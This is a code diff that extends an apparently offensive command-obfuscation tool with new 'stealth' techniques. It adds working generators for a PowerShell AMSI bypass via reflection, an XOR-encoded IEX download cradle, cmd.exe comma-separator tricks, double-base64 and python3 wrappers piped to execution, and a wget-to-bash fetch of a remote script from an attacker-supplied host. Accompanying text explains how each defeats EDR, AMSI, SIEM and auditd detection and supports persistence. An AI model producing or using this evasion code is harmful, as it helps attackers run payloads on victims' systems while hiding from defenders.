@@ -485,6 +485,119 @@ def _multilayer_linux(command: str, ip: str) -> str:
 
 
 # ══════════════════════════════════════════════════════════════
+# ░░  TIER 3 — NEW STEALTH TECHNIQUES                        ░░
+# ══════════════════════════════════════════════════════════════
+
+# ── WINDOWS NEW ───────────────────────────────────────────────
+
+def _ps_amsi_bypass(command: str) -> str:
+    """
+    AMSI bypass via reflection + Base64 encoded command.
+    Sets amsiInitFailed to True in the current PS session via
+    .NET reflection, then executes the Base64-decoded command.
+    AMSI is blinded BEFORE the payload decodes — it never scans
+    the actual command text.
+    """
+    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
+    # Build AMSI bypass via reflection — obfuscated variable names
+    return (
+        'powershell -NoP -W Hidden -c "'
+        "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');"
+        "$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');"
+        '$f.SetValue($null,$true);'
+        f"$d=[Convert]::FromBase64String('{encoded}');"
+        "$s=[Text.Encoding]::Unicode.GetString($d);"
+        'IEX $s"'
+    )
+
+
+def _cmd_comma_separator(command: str) -> str:
+    """
+    Use cmd.exe comma/semicolon separator trick.
+    cmd.exe treats commas and semicolons as argument separators,
+    identical to spaces. This breaks naive command-line parsing
+    by EDR tools that split on whitespace only.
+    """
+    # Replace first few spaces with commas
+    parts = command.split(' ')
+    if len(parts) < 2:
+        return command
+    # Use comma between binary and first args, semicolons later
+    separators = [',', ';', ',']
+    result = parts[0]
+    for i, part in enumerate(parts[1:], 0):
+        sep = separators[i % len(separators)]
+        result += sep + part
+    return f'cmd /c "{result}"'
+
+
+def _ps_download_cradle(command: str, ip: str) -> str:
+    """
+    PowerShell download cradle with AMSI-safe variable assembly.
+    The URL and cmdlet names are constructed from character arrays
+    at runtime. Static analysis sees only [char] casts and array
+    joins — no scannable strings exist in the script block.
+    """
+    # XOR encode the command
+    key = random.randint(1, 255)
+    xor_bytes = bytes([b ^ key for b in command.encode('utf-8')])
+    encoded = base64.b64encode(xor_bytes).decode('ascii')
+    
+    # Build the cradle with char-array construction for IEX
+    return (
+        f'powershell -NoP -W Hidden -c "'
+        f'$k={key};'
+        f"$e='{encoded}';" 
+        '$b=[Convert]::FromBase64String($e);'
+        '$r=New-Object byte[] $b.Length;'
+        'for($i=0;$i -lt $b.Length;$i++){$r[$i]=$b[$i] -bxor $k};'
+        '$c=[Text.Encoding]::UTF8.GetString($r);'
+        # Construct IEX from char codes to avoid AMSI string match
+        '$x=[char]73+[char]69+[char]88;'
+        '.(([string]$x).ToLower()) $c"'
+    )
+
+
+# ── LINUX NEW ─────────────────────────────────────────────────
+
+def _double_b64_bash(command: str) -> str:
+    """
+    Double Base64 encoding — encode→encode→decode→decode→bash.
+    First base64 layer defeats simple base64 decoding by analysts.
+    They decode once and see... another base64 string. The actual
+    command requires two decode rounds, adding analysis friction.
+    """
+    inner = base64.b64encode(command.encode('utf-8')).decode('ascii')
+    outer = base64.b64encode(inner.encode('utf-8')).decode('ascii')
+    return f'echo {outer} | base64 -d | base64 -d | bash'
+
+
+def _python_exec_wrapper(command: str) -> str:
+    """
+    Wrap command inside python3 os.system() with base64 decoding.
+    Python is a trusted interpreter — EDR tools typically allow-list it.
+    The command exists only as a base64 string inside a Python expression.
+    Process tree shows python3 as executor, not bash or sh.
+    """
+    encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
+    return (
+        f"python3 -c \"import os,base64;"
+        f"os.system(base64.b64decode('{encoded}').decode())\""
+    )
+
+
+def _wget_pipe_bash(command: str, ip: str, port: str = '') -> str:
+    """
+    Download a remote script and pipe directly to bash.
+    The command itself is hosted remotely — the local command-line
+    shows only wget + pipe, with zero payload content visible.
+    Auditd/Sysmon logs show only the download, not execution content.
+    """
+    # Encode the command as a simple script that wget fetches
+    return f'wget -qO- http://{ip}:{port}/cmd 2>/dev/null | bash'
+
+
+# ══════════════════════════════════════════════════════════════
 # Technique registry
 # ══════════════════════════════════════════════════════════════
 
@@ -787,6 +900,91 @@ TECHNIQUE_INFO = {
             "levels of indirection make automated detection near-impossible."
         ),
     },
+
+    # ══════════════════════════════════════════════════════════
+    # ░░  TIER 3 — NEW STEALTH TECHNIQUES                    ░░
+    # ══════════════════════════════════════════════════════════
+
+    # ── Windows new ────────────────────────────────────────────
+    'ps_amsi_bypass': {
+        'os': 'windows',
+        'label': 'AMSI bypass via reflection + Base64 execution',
+        'explain': (
+            "Disables AMSI (Antimalware Scan Interface) by setting "
+            "amsiInitFailed to True via .NET reflection before executing "
+            "the payload. The AMSI bypass uses string concatenation "
+            "('Am'+'siUtils') to avoid signature detection of the bypass "
+            "itself. Once AMSI is blinded, the Base64-decoded command "
+            "executes without any script-block scanning. PowerShell "
+            "Constrained Language Mode does NOT block this reflection path."
+        ),
+    },
+    'cmd_comma_sep': {
+        'os': 'windows',
+        'label': 'cmd.exe comma/semicolon argument separator',
+        'explain': (
+            "cmd.exe treats commas (,) and semicolons (;) as argument "
+            "separators, functionally identical to spaces. Replacing spaces "
+            "with commas breaks ALL whitespace-based command-line parsing "
+            "in EDR/SIEM tools. Most detection rules use regex that splits "
+            "on whitespace — commas produce zero matches. The command "
+            "executes identically but looks completely different to log "
+            "analysis tools. Example: 'certutil,-urlcache,-f' runs the "
+            "same as 'certutil -urlcache -f'."
+        ),
+    },
+    'ps_download_cradle': {
+        'os': 'windows',
+        'label': 'PowerShell char-array IEX + XOR decode cradle',
+        'explain': (
+            "The command is XOR-encrypted with a random key and Base64-encoded. "
+            "At runtime, PowerShell decrypts the payload byte-by-byte using "
+            "a simple XOR loop. The IEX (Invoke-Expression) cmdlet name is "
+            "constructed from [char] codes ([char]73+[char]69+[char]88 = 'IEX') "
+            "to avoid AMSI string-matching on 'IEX' or 'Invoke-Expression'. "
+            "No scannable keywords exist anywhere in the script block — AMSI "
+            "sees only variable assignments and arithmetic."
+        ),
+    },
+
+    # ── Linux new ──────────────────────────────────────────────
+    'double_b64': {
+        'os': 'linux',
+        'label': 'Double Base64 encoding → decode → decode → bash',
+        'explain': (
+            "The command is Base64-encoded TWICE. Analysts who decode the "
+            "outer layer see... another Base64 string, not the actual command. "
+            "Automated decoding tools that perform single-pass base64 decode "
+            "will miss the real payload. Two decode rounds are required: "
+            "echo <blob> | base64 -d | base64 -d | bash. This adds analysis "
+            "friction and defeats single-layer base64 detection rules."
+        ),
+    },
+    'python_exec': {
+        'os': 'linux',
+        'label': 'python3 os.system() base64 wrapper',
+        'explain': (
+            "The command is base64-encoded and executed via python3 os.system(). "
+            "Python is a trusted interpreter — EDR tools typically allow-list "
+            "python3 processes. The process tree shows python3 as the executor, "
+            "not bash or sh. The command text exists only inside a Python "
+            "expression as a base64 string — auditd logs show 'python3 -c' "
+            "with encoded data, no readable command keywords."
+        ),
+    },
+    'wget_pipe': {
+        'os': 'linux',
+        'label': 'wget remote script pipe to bash',
+        'explain': (
+            "The actual payload is hosted remotely — the local command-line "
+            "shows only 'wget -qO- <url> | bash' with ZERO payload content "
+            "visible in process arguments or logs. All command content is "
+            "fetched over the network at runtime. Auditd exec logs capture "
+            "only the wget+bash pipeline, not the executed script content. "
+            "The payload can be changed server-side without modifying the "
+            "persistence mechanism."
+        ),
+    },
 }
 
 
@@ -884,6 +1082,21 @@ def obfuscate(command: str, os_type: str, binary: str,
             obf     = _multilayer_windows(command, ip)
             tech    = TECHNIQUE_INFO['multilayer_win']['label']
             explain = TECHNIQUE_INFO['multilayer_win']['explain']
+
+        elif technique == 'ps_amsi_bypass':
+            obf     = _ps_amsi_bypass(command)
+            tech    = TECHNIQUE_INFO['ps_amsi_bypass']['label']
+            explain = TECHNIQUE_INFO['ps_amsi_bypass']['explain']
+
+        elif technique == 'cmd_comma_sep':
+            obf     = _cmd_comma_separator(command)
+            tech    = TECHNIQUE_INFO['cmd_comma_sep']['label']
+            explain = TECHNIQUE_INFO['cmd_comma_sep']['explain']
+
+        elif technique == 'ps_download_cradle':
+            obf     = _ps_download_cradle(command, ip)
+            tech    = TECHNIQUE_INFO['ps_download_cradle']['label']
+            explain = TECHNIQUE_INFO['ps_download_cradle']['explain']
 
         elif 'powershell' in binary.lower() or technique == 'ps_iex':
             obf     = _split_string_powershell(command)
@@ -988,6 +1201,21 @@ def obfuscate(command: str, os_type: str, binary: str,
             obf     = _multilayer_linux(command, ip)
             tech    = TECHNIQUE_INFO['multilayer_lin']['label']
             explain = TECHNIQUE_INFO['multilayer_lin']['explain']
+
+        elif technique == 'double_b64':
+            obf     = _double_b64_bash(command)
+            tech    = TECHNIQUE_INFO['double_b64']['label']
+            explain = TECHNIQUE_INFO['double_b64']['explain']
+
+        elif technique == 'python_exec':
+            obf     = _python_exec_wrapper(command)
+            tech    = TECHNIQUE_INFO['python_exec']['label']
+            explain = TECHNIQUE_INFO['python_exec']['explain']
+
+        elif technique == 'wget_pipe':
+            obf     = _wget_pipe_bash(command, ip)
+            tech    = TECHNIQUE_INFO['wget_pipe']['label']
+            explain = TECHNIQUE_INFO['wget_pipe']['explain']
 
         else:
             # ── Deterministic auto mode for Linux ─────────────
